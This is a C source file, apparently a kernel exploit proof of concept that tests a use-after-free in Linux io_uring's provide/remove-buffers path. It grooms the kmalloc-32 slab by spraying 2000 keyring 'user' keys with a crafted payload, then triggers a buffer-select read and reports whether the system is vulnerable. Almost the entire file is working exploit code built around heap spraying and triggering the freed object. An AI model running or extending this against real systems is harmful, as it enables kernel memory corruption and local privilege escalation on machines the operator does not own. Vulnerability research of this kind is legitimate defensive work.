#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <stdint.h>
#include <linux/keyctl.h>

#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif
#ifndef __NR_io_uring_register
#define __NR_io_uring_register 427
#endif
#ifndef __NR_add_key
#define __NR_add_key 217
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 218
#endif

#define IORING_OP_READ 22
#define IORING_OP_PROVIDE_BUFFERS 31
#define IORING_OP_REMOVE_BUFFERS 32

#define IOSQE_BUFFER_SELECT (1U << 1)

struct io_uring_sqe
{
    uint8_t opcode;
    uint8_t flags;
    uint16_t ioprio;
    int32_t fd;
    union
    {
        uint64_t off;
        uint64_t addr2;
    };
    union
    {
        uint64_t addr;
        uint64_t splice_off_in;
    };
    uint32_t len;
    union
    {
        uint32_t rw_flags;
        uint32_t buf_index;
        uint32_t buf_group;
    };
    uint64_t user_data;
    union
    {
        uint16_t buf_index_16;
        uint16_t buf_group_16;
    };
    int32_t personality;
    int32_t splice_fd_in;
    uint64_t __pad2[2];
};

struct io_uring_cqe
{
    uint64_t user_data;
    int32_t res;
    uint32_t flags;
};

struct io_uring_params
{
    uint32_t sq_entries;
    uint32_t cq_entries;
    uint32_t flags;
    uint32_t sq_thread_cpu;
    uint32_t sq_thread_idle;
    uint32_t features;
    uint32_t wq_fd;
    uint32_t resv[3];
    struct
    {
        uint32_t head;
        uint32_t tail;
        uint32_t ring_mask;
        uint32_t ring_entries;
        uint32_t flags;
        uint32_t dropped;
        uint32_t array;
        uint32_t resv1;
        uint64_t resv2;
    } sq_off;
    struct
    {
        uint32_t head;
        uint32_t tail;
        uint32_t ring_mask;
        uint32_t ring_entries;
        uint32_t overflow;
        uint32_t cqes;
        uint32_t flags;
        uint32_t resv1;
        uint64_t resv2;
    } cq_off;
};

struct io_uring_ring
{
    int ring_fd;
    struct io_uring_params params;
    void *sq_ptr;
    void *cq_ptr;
    unsigned *sq_head;
    unsigned *sq_tail;
    unsigned *sq_mask;
    unsigned *sq_array;
    unsigned *cq_head;
    unsigned *cq_tail;
    unsigned *cq_mask;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;
};

static int io_uring_setup(unsigned entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}

static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete,
                          unsigned flags, void *sig)
{
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

static int setup_uring(struct io_uring_ring *ring)
{
    memset(&ring->params, 0, sizeof(ring->params));
    ring->ring_fd = io_uring_setup(32, &ring->params);
    if (ring->ring_fd < 0)
        return -1;

    size_t sq_ring_sz = ring->params.sq_off.array + ring->params.sq_entries * sizeof(unsigned);
    size_t cq_ring_sz = ring->params.cq_off.cqes + ring->params.cq_entries * sizeof(struct io_uring_cqe);
    size_t sqes_sz = ring->params.sq_entries * sizeof(struct io_uring_sqe);

    ring->sq_ptr = mmap(0, sq_ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring->ring_fd, 0);
    ring->cq_ptr = mmap(0, cq_ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring->ring_fd, 0x8000000ULL);

    // Explicitly mapping sqes separately
    ring->sqes = mmap(0, sqes_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring->ring_fd, 0x10000000ULL);

    if (ring->sq_ptr == MAP_FAILED || ring->cq_ptr == MAP_FAILED || ring->sqes == MAP_FAILED)
    {
        return -1;
    }

    ring->sq_head = ring->sq_ptr + ring->params.sq_off.head;
    ring->sq_tail = ring->sq_ptr + ring->params.sq_off.tail;
    ring->sq_mask = ring->sq_ptr + ring->params.sq_off.ring_mask;
    ring->sq_array = ring->sq_ptr + ring->params.sq_off.array;
    ring->cq_head = ring->cq_ptr + ring->params.cq_off.head;
    ring->cq_tail = ring->cq_ptr + ring->params.cq_off.tail;
    ring->cq_mask = ring->cq_ptr + ring->params.cq_off.ring_mask;
    ring->cqes = ring->cq_ptr + ring->params.cq_off.cqes;

    return 0;
}

static struct io_uring_sqe *get_sqe(struct io_uring_ring *ring)
{
    unsigned head = *ring->sq_head;
    unsigned tail = *ring->sq_tail;
    unsigned mask = *ring->sq_mask;
    unsigned next_tail = tail + 1;

    if (next_tail - head > *ring->sq_mask)
        return NULL;

    struct io_uring_sqe *sqe = &ring->sqes[tail & mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->fd = -1;
    return sqe;
}

static void submit_sqe(struct io_uring_ring *ring)
{
    unsigned tail = *ring->sq_tail;
    unsigned mask = *ring->sq_mask;
    ring->sq_array[tail & mask] = tail & mask;
    __sync_synchronize();
    *ring->sq_tail = tail + 1;
    __sync_synchronize();
    io_uring_enter(ring->ring_fd, 1, 1, 0, NULL);
}

// Key Spraying
static long add_key(const char *type, const char *desc, const void *payload, size_t plen, int keyring)
{
    return syscall(__NR_add_key, type, desc, payload, plen, keyring);
}

int main(int argc, char **argv)
{
    struct io_uring_ring ring;
    if (setup_uring(&ring) < 0)
    {
        perror("setup_uring");
        return 1;
    }

    printf("[*] io_uring setup complete. Testing UAF via Key Spray.\n");

    // 1. Allocate backing buffer
    void *buf = mmap(NULL, 0x1000 * 100, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(buf, 'A', 0x1000 * 100);

    // 2. Provide 100 buffers
    printf("[*] Providing 100 buffers...\n");
    for (int i = 0; i < 100; i++)
    {
        struct io_uring_sqe *sqe = get_sqe(&ring);
        sqe->opcode = IORING_OP_PROVIDE_BUFFERS;
        sqe->fd = 1;
        sqe->addr = (uint64_t)buf + i * 0x100;
        sqe->len = 0x100;
        sqe->off = 1; // BGID 1
        sqe->buf_index_16 = i;
        sqe->user_data = i;
        submit_sqe(&ring);
    }

    printf("[*] Buffers provided.\n");

    // 3. Remove ALL 100 Buffers
    printf("[*] Removing ALL 100 buffers...\n");
    struct io_uring_sqe *sqe = get_sqe(&ring);
    sqe->opcode = IORING_OP_REMOVE_BUFFERS;
    sqe->fd = 100; // Remove 100 buffers
    sqe->off = 1;  // BGID 1
    submit_sqe(&ring);

    // Check removal status
    unsigned head = *ring.cq_head;
    while (head == *ring.cq_tail)
        usleep(100);
    struct io_uring_cqe *cqe = &ring.cqes[head & *ring.cq_mask];
    printf("[*] Remove Result: %d (Expected > 0, e.g. 100)\n", cqe->res);
    *ring.cq_head = head + 1; // Advance

    // 4. Spray Keys
    printf("[*] Spraying Keys into kmalloc-32 to catch UAF...\n");

    char payload[8];
    memset(payload, 'B', sizeof(payload));

    uint32_t *target_len = (uint32_t *)&payload[0];
    uint16_t *target_bid = (uint16_t *)&payload[4];
    uint16_t *target_bgid = (uint16_t *)&payload[6];

    *target_len = 0x1337; // Marker
    *target_bid = 0;
    *target_bgid = 1;

    char desc[32];
    for (int k = 0; k < 2000; k++)
    { // Increased spray count
        sprintf(desc, "uaf_%d", k);
        add_key("user", desc, payload, sizeof(payload), KEY_SPEC_PROCESS_KEYRING);
    }

    // 5. Trigger Use
    printf("[*] Attempting to READ from buffer group 1...\n");
    int pipefd[2];
    pipe(pipefd);
    write(pipefd[1], "TEST", 4);

    struct io_uring_sqe *rw_sqe = get_sqe(&ring);
    rw_sqe->opcode = IORING_OP_READ; // READ (22)
    rw_sqe->fd = pipefd[0];
    rw_sqe->addr = (uint64_t)buf; // Ignored/Used for dest selection
    rw_sqe->len = 0x1337;         // Big read
    rw_sqe->flags = IOSQE_BUFFER_SELECT;
    rw_sqe->buf_group = 1;
    rw_sqe->user_data = 9999;

    submit_sqe(&ring);

    // Check CQE
    head = *ring.cq_head;
    while (head == *ring.cq_tail)
    {
        usleep(1000);
    }

    cqe = &ring.cqes[head & *ring.cq_mask];
    printf("[*] Read Result: %d\n", cqe->res);

    if (cqe->res == -ENOBUFS)
    {
        // -ENOBUFS = -105
        printf("[-] FAILED: No buffers available (-ENOBUFS). Remove worked cleanly.\n");
    }
    else if (cqe->res >= 0)
    {
        printf("[!!!] VULNERABLE! Read succeeded despite removing all buffers!\n");
        printf("[!!!] Result: %d\n", cqe->res);
    }
    else
    {
        printf("[-] Error: %d\n", cqe->res);
    }

    return 0;
}
